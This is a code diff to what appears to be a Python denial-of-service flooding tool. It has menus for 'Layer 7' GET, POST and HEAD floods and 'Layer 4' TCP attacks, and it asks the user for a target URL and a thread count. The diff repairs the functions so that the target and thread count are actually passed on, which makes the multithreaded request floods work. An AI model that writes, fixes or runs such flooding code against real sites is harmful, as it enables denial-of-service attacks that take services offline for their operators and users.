@@ -79,7 +79,7 @@ def l7():
     if cm=='2':
         url=input('URL:')
         th=int(input('Thread:'))
-        get()
+        get(url,th)
     elif cm=='1':
         url=input('URL:')
         th=int(input('Thread:'))
@@ -87,11 +87,11 @@ def l7():
     elif cm=='4':
         url=input('URL:')
         th=int(input('Thread:'))
-        head()
+        head(url,th)
     elif cm=='3':
         url=input('URL:')
         th=int(input('Thread:'))
-        post()
+        post(url,th)
 def l4():
     stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 4"+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+"[1] • "+Fore.WHITE+"TCP        "+Fore.RED+": "+Fore.WHITE+"\n")
@@ -102,7 +102,7 @@ def l4():
     
 
 
-def get():
+def get(url,th):
     start = time.perf_counter()
     client = requests.Session()
 
@@ -118,7 +118,7 @@ def get():
         task = threading.Thread(target=request, args=(secret,))       
         task.start()
         tasks.append(task)
-def post():
+def post(url,th):
     start = time.perf_counter()
     client = requests.Session()
 
@@ -134,7 +134,7 @@ def post():
         task = threading.Thread(target=request, args=(secret,))       
         task.start()
         tasks.append(task)
-def head():
+def head(url,th):
     start = time.perf_counter()
     client = requests.Session()
 
